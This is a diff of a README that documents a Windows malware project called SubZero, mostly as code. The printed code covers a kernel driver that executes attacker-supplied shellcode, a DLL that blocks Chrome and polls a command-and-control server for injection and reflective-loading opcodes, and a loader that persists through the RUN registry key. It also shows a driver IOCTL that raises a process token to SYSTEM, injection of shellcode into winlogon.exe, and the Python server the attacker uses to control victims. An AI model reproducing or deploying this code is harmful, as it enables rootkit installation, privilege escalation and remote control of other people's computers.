@@ -374,24 +374,24 @@ The handler then initialize a `PisParameters` structure with the addresses of `M
 		return STATUS_INSUFFICIENT_RESOURCES;
 	}
 
-	PicParameters picParameters
+	PisParameters pisParameters
 	{
 		MmGetSystemRoutineAddress,
 		returnedDataAddress,
 		buffer->ReturnedDataMaxSize
 	};
 
-	auto* const picAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
-	if (nullptr == picAddress) {
-		KdPrint((DRIVER_PREFIX "[-] Error allocating PIC space\n"));
+	auto* const pisAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
+	if (nullptr == pisAddress) {
+		KdPrint((DRIVER_PREFIX "[-] Error allocating PIS space\n"));
 		return STATUS_INSUFFICIENT_RESOURCES;
 	}
 
-	::RtlCopyMemory(picAddress, reinterpret_cast<PCHAR>(buffer) + buffer->ShellcodeOffset, buffer->ShellcodeSize);
-	auto const pic = static_cast<PicFunction>(picAddress);
+	::RtlCopyMemory(pisAddress, reinterpret_cast<PCHAR>(buffer) + buffer->ShellcodeOffset, buffer->ShellcodeSize);
+	auto const pis = static_cast<PisFunction>(pisAddress);
 
 	HANDLE threadHandle;
-	auto status = ::PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, nullptr, nullptr, pic, &picParameters);
+	auto status = ::PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, nullptr, nullptr, pis, &pisParameters);
 	if (!NT_SUCCESS(status))
 		return status;
 
@@ -405,14 +405,14 @@ The handler then initialize a `PisParameters` structure with the addresses of `M
 		return status;
 
 	// Copy returned data to user buffer
-	::RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, picParameters.ReturnedDataAddress, buffer->ReturnedDataMaxSize);
+	::RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, pisParameters.ReturnedDataAddress, buffer->ReturnedDataMaxSize);
 
 	// Set returned data buffer size
-	Irp->IoStatus.Information = picParameters.ReturnedDataMaxSize;
+	Irp->IoStatus.Information = pisParameters.ReturnedDataMaxSize;
 
-	// Free PIC memory
+	// Free PIS memory
 	::ExFreePoolWithTag(returnedDataAddress, DRIVER_TAG);
-	::ExFreePoolWithTag(picAddress, DRIVER_TAG);
+	::ExFreePoolWithTag(pisAddress, DRIVER_TAG);
 
 	return STATUS_SUCCESS;
 	...
@@ -426,17 +426,17 @@ An example of a kernel PIS is the following function, that returns the PID of th
 void
 __declspec(safebuffers)
 __declspec(noinline)
-__stdcall PicStart(PVOID StartContext)
+__stdcall PisStart(PVOID StartContext)
 {
 	// __debugbreak(); // INT 3 for debugging
 	
 	if (nullptr == StartContext)
 		return;
 		
-	PicParameters* picParameters = (PicParameters*)StartContext;
+	PisParameters* pisParameters = (PisParameters*)StartContext;
 	
 	// Get MmGetSystemRoutineAddress
-	pMmGetSystemRoutineAddress mmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)picParameters->MmGetSystemRoutineAddress;
+	pMmGetSystemRoutineAddress mmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)pisParameters->MmGetSystemRoutineAddress;
 	
 	if (nullptr == mmGetSystemRoutineAddress)
 		return;
@@ -467,14 +467,14 @@ __stdcall PicStart(PVOID StartContext)
 		
 	// Convert to ULONG and copy to returned data address
 	ULONG pid = ::HandleToULong(psGetProcessId(process));
-	rtlCopyMemory(picParameters->ReturnedDataAddress, &pid, sizeof(pid));
+	rtlCopyMemory(pisParameters->ReturnedDataAddress, &pid, sizeof(pid));
 }
 ```
 >**Note**: In order to avoid any strings from being located at the .data section and make the PIS read from an unknown address (since it executes from a different context), they are stored on the stack as a `WCHAR` array.
 
 ## DLL  
 
-As mentioned earlier, in order to prevent the chrome application from starting the loaded library's `DllMain` function needs to be infinite (i.e. never return).   An HTTP client object is created using [httplib](https://github.com/yhirose/cpp-httplib)'s header and a response handler is set to be called whenever a command from the server is received. A GET request is sent to the server every 5 seconds in an endless loop and if a connection could not be established, a new object is created and loop continues:
+As mentioned earlier, in order to prevent the chrome application from start, the loaded library's `DllMain` function needs to be infinite (i.e. never return).   An HTTP client object is created using [httplib](https://github.com/yhirose/cpp-httplib)'s header and a response handler function is set to be called whenever a command from the server is received. A GET request is sent to the server every 5 seconds in an endless loop and if a connection could not be established, a new object is created and loop continues:
 ```cpp
   BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
 {
@@ -512,7 +512,7 @@ As mentioned earlier, in order to prevent the chrome application from starting t
   
   > **Note:** As you can see, the above code (and the rest of the user-mode code in this project) uses `C++ 17` features like smart pointers, exception handling and OOP excessively.
  
- The client and server have opcodes that the use to communicate with - these will be set under the `'Opcode'` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same opcode.
+The client and server have opcodes that the use to communicate with - these will be set under the `'Opcode'` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same opcode.
  The user-mode library offer the attacker 3 other opcodes - inject a kernel mode shellcode, reflectively load a DLL and to completely remove the malware from the system. The result of the operation is then sent back to the server. To makes things clearer, this is how the opcodes are defined:
 ```cpp
  constexpr uint8_t KeepAliveOpcode = 0;
@@ -551,11 +551,11 @@ enum class ClientOpcode
 	
 	DWORD bytesReturned = 0;
 	if (!::DeviceIoControl(
-			deviceAutoHandle.get(), 									// device to be queried
+			deviceAutoHandle.get(), 										// device to be queried
 			IOCTL_SUBZERO_EXECUTE_SHELLCODE, 								// operation to perform
 			inputBuffer.get(), bufferSize, 									// input buffer
-			outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize, 					// output buffer
-			&bytesReturned, 										// # bytes returned
+			outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize, 	// output buffer
+			&bytesReturned, 												// # bytes returned
 			nullptr))
 			throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
 			
@@ -634,13 +634,242 @@ The loader is the first file that is dropped on a new victim. It starts by chang
 ```
 Next, the file adds itself as a value to the RUN registry key. Any errors during the loading process will cleanup the malware:
 ```cpp
-
+	try 
+	{
+		AutoRegistryKeyHandle AutoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
+		RegistryManager::SetRegistryValue(AutoRegKey.get(), REG_VALUE_NAME, REG_SZ,
+		(PVOID)LAUNCHER_FULL_PATH.c_str(), LAUNCHER_FULL_PATH.length() * sizeof(WCHAR));
+		DEBUG_PRINT("[+] Successfully Added as RUN value");
+	}
+	catch (const Win32ErrorCodeException& exception) 
+	{
+		SubZeroCleanup::Cleanup();
+		DEBUG_PRINT(exception.what());
+	}
+return 0;
+}
 ```
-  
+The loader functions from utility classes, located in the `SubZeroUtils` project. These classes provide RAII and windows' API wrappers in order to simplify the code writing and reading experience.
+An example of such class is this `RegistryManager` class:
+```cpp
+class RegistryManager
+{
+public:
+	virtual ~RegistryManager() = default;
+
+	// Delete copy constructor, assignment operator, move constructor, move operator:
+	RegistryManager& operator=(const RegistryManager&) = delete;
+	RegistryManager(const RegistryManager&) = delete;
+	RegistryManager(RegistryManager&&) = delete;
+	RegistryManager& operator=(RegistryManager&&) = delete;
+
+	static HKEY OpenRegistryKey(HKEY hKeyRoot, const std::wstring wsSubKey);
+
+	static HKEY CreateRegistryKey(HKEY hKeyRoot, const std::wstring wsSubKey);
+
+	static void DeleteRegistryKey(HKEY hKeyRoot, const std::wstring wsSubKey);
+
+	static void SetRegistryValue(HKEY hKey, const std::wstring wsValue, DWORD dwType, PVOID pData, DWORD dwSize);
+
+	static void DeleteRegistryValue(HKEY hKey, const std::wstring wsValue);
+};
+```
 ## Cleanup  
-  
-## Server  
-  
+  Both the loader and the DLL can call the malware's cleanup. Initially, there's a check whether the driver is loaded and if it is - there's another check to the current process' token. If the token isn't system's the process uses the driver to set it, then it unloads the driver:
+```cpp
+	// Uninstall SubZero driver if exists.
+	const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
+	if (ERROR_SERVICE_DOES_NOT_EXIST != ::GetLastError())
+	{
+		try
+		{
+			// If the current process is not elevated to SYSTEM, elevate it using the driver before un-installing it.
+			if (!IsLocalSystem())
+			{
+				const AutoHandle deviceAutoHandle(::CreateFile(
+					L"\\\\.\\" DRIVER_NAME,
+					FILE_SHARE_READ | FILE_SHARE_WRITE,
+					0,
+					nullptr,
+					OPEN_EXISTING,
+					0,
+					nullptr));
+
+				if (INVALID_HANDLE_VALUE == deviceAutoHandle.get())
+					finalException << DEBUG_TEXT("[-] Failed to open the device handle");
+
+				SubZeroSetTokenToSystemData pid = ::GetCurrentProcessId();
+
+				DWORD bytesReturned = 0;
+				if (!::DeviceIoControl(
+					deviceAutoHandle.get(), // device to be queried
+					IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM, // operation to perform
+					&pid, sizeof(pid), // input buffer
+					nullptr, 0, // output buffer
+					&bytesReturned, // # bytes returned
+					nullptr))
+					{
+						finalException << DEBUG_TEXT("[-] DeviceIoControl Failed");
+					}
+					
+					// Current process now will bw able to inject the PIS to winlogon.exe
+					picTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
+			}	
+		}
+		catch (std::exception& exception)
+		{
+			finalException << DEBUG_TEXT(exception.what() << "\n");
+		}
+		
+		// Driver is loaded - this function must succeed in order to continue. Any error here should be caught by the caller and handled accordingly.
+		serviceManager.stopAndRemove();
+	}
+``` 
+  >Because the driver protects the registry key and the chrome process, unloading it should be the first action of the cleanup process.
+ 
+Next, the registry key and malicious files are deleted. Here we face another problem while trying to delete some of the files. There will always be one file that cannot be deleted - the file the we're running from. This can be `eventlog_provider.dll` in case of a remote cleanup command from the server or `GoogleUpdateClient` in case of a failure in the loading process. To successfully delete these files we'll need to execute code on a different process, for that we can use the aforementioned PIS injection method. The following PIS closes the process with the PID it receives after it sleeps for 3 seconds (to give the client time to send a response to the server), then it deletes both files from the file system (even if only one of them will exist): 
+```cpp
+WINAPI PisStart(struct PisParameters* pisParameters)
+{
+	pLoadLibraryA loadLibraryA = (pLoadLibraryA)(pisParameters->loadLibraryA);
+	pGetProcAddress getProcAddress = (pGetProcAddress)pisParameters->getProcAddress;
+	CHAR kernel32Dll[] = { 'k','e','r','n','e','l', '3', '2','.','d','l','l','\0' };
+	
+	// Function names
+	CHAR sleepName[] = { 'S','l','e','e','p','\0' };
+	CHAR openProcessName[] = { 'O','p','e','n','P','r','o','c','e','s','s','\0' };
+	CHAR terminateProcessName[] = { 'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s','\0' };
+	CHAR closeHandleName[] = { 'C','l','o','s','e','H','a','n','d','l','e', '\0' };
+	CHAR deleteFileAName[] = { 'D','e','l','e','t','e','F','i','l','e','A','\0' };
+	
+	// File paths
+	CHAR launcherPath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','G','o','o','g','l','e','\\' \
+	,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','G','o','o','g','l','e','U','p','d','a','t','e' \
+	,'C','l','i','e','n','t','.','e','x','e','\0' };
+
+	CHAR dllPath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','G','o','o','g','l','e','\\' \
+	,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','e','v','e','n','t','l','o','g','_','p','r','o' \
+	,'v','i','d','e','r','.','d','l','l','\0' };
+
+	// Get function pointers
+	HMODULE kernel32Module = loadLibraryA(kernel32Dll);
+	pSleep sleep = (pSleep)getProcAddress(kernel32Module, sleepName);
+	pOpenProcess openProcess = (pOpenProcess)getProcAddress(kernel32Module, openProcessName);
+	pTerminateProcess terminateProcess = (pTerminateProcess)getProcAddress(kernel32Module, terminateProcessName);
+	pCloseHandle closeHandle = (pCloseHandle)getProcAddress(kernel32Module, closeHandleName);
+	pDeleteFileA deleteFileA = (pDeleteFileA)getProcAddress(kernel32Module, deleteFileAName);
+	
+	// Give the client time to send the server a response
+	sleep(3000);
+	
+	// Terminate the calling process
+	HANDLE hProcess = openProcess(PROCESS_TERMINATE, FALSE, pisParameters->pid);
+	if (nullptr != hProcess)
+		terminateProcess(hProcess, 1);
+	
+	closeHandle(hProcess);
+	
+	// Give the process time to terminate
+	sleep(1000);
+	
+	// Delete files from disk
+	deleteFileA(launcherPath);
+	deleteFileA(dllPath);
+	return 0;
+}
+```
+In case the file deletion operation require high privileges, The decided PIS executing process needs to have these appropriate ones and is preferred to always exist and run in background. For that, `winlogon.exe` makes a great target - it always runs as `SYSTEM` and it is present in every windows system. In order to inject the PIS to `winlogon` the current process also needs to have `SYSTEM` privileges - that is the reason for the privilege escalation done earlier.
+If the escalation fails (either because the driver isn't loaded or because an error in the `DeviceIOControl` call) the process creates a new `cmd` process and sets it as the injection target process.
+The cleanup process finishes by injecting the PIS and throwing an exception log in case of an error:
+```cpp
+	// Setup PIS parameters
+	PisParameters pisParamameters =
+	{
+		LoadLibraryA,
+		GetProcAddress,
+		static_cast<int>(::GetCurrentProcessId())
+	};
+	
+	if (nullptr == pisParamameters.getProcAddress || nullptr == pisParamameters.loadLibraryA)
+		finalException << DEBUG_TEXT("[-] Invalid PIS parameters\n");
+	else
+	{
+		// Inject PIS
+		try
+		{
+			PISInjection::InjectPis<PisParameters>(picTargetPID, &pisParamameters, PisStart, PisEnd);
+		}
+		catch (std::exception& exception)
+		{
+			finalException << DEBUG_TEXT(exception.what() << "\n");
+		}
+	}
+	
+	// Throw full exception log if exist
+	if (finalException.str().length() > 0)
+		throw std::runtime_error(finalException.str());
+}
+```
+## Server 
+
+I tried to keep the remote server as simple as possible. The easiest way to write an HTTP server is to use python's `http` module. The server provides a basic console that the attacker can use to send a command to a remote client (the server only supports one connection at a time). After a command is entered the server builds a GET packet with the respective opcode and body and sends it to the client. Any data received in a POST packet  is printed - this could be an error log or an output from a sent kernel PIS or DLL.
+
+The following python code demonstrates the GET and POST request handlers:
+```python
+def do_GET(self):
+	server_opcode = KEEP_ALIVE_OPCODE
+	packet_body = b""
+	returned_data_max_size = 0
+	if not q.empty():
+		item = q.get()
+		q.task_done()
+		server_opcode = item[OPCODE]
+		if server_opcode != ServerOpcode.Cleanup:
+			print(f"[SERVER] Sending {item[FILE_PATH]} to {self.client_address[0]}...")
+		try:
+			with open(item[FILE_PATH], 'rb') as file:
+				packet_body = file.read()
+		except:
+				print(f"[SERVER] Error reading: {item[FILE_PATH]}")
+				
+	if server_opcode == ServerOpcode.InjectKernelShellcode:
+		returned_data_max_size = item[RETURNED_DATA_MAX_SIZE]
+	else:
+		print(f"[SERVER] Removing client from {self.client_address[0]}...")
+		
+	self.send_response(200)
+	self.send_header("Opcode", server_opcode)
+	self.send_header("Returned-Data-Size", returned_data_max_size)
+	self.end_headers()
+	self.wfile.write(packet_body)
+	
+def do_POST(self):
+	length = int(self.headers['Content-Length'])
+	packet_patrameters = urllib.parse.parse_qs(self.rfile.read(length).decode('utf-8'))
+	client_opcode = ord(packet_patrameters["Opcode"][0])
+	
+	if client_opcode != KEEP_ALIVE_OPCODE:	
+		# USE match STATEMENT ON PYTHON 3.10 FOR A MORE COMPLEX SWITCH - CURRENTLY ON BETA
+		if client_opcode == ClientOpcode.Success:
+			print(f"[{self.client_address[0]}] Operation completed successfully.")
+		else:
+			print(f"[{self.client_address[0]}] Operation failed.")
+
+		if 'Returned-Data' in packet_patrameters:
+			# Handle returned data accordingly
+			print(f"[{self.client_address[0]}] Returned data (String): \n{packet_patrameters['Returned-Data'][0]}")
+
+			# In my case - PIS should return a PID
+			print(f"[{self.client_address[0]}] Kernel PIS ran by PID: {ord(packet_patrameters['Returned-Data'][0])}")
+```
+
 # Execution
+* Loading the driver (in debug mode):
+
+* Closing the chrome process from task manager:
+
+* Deleting the malware's registry value:
+
+* Sending command from the server console and receiving results:
 
 # TODO List
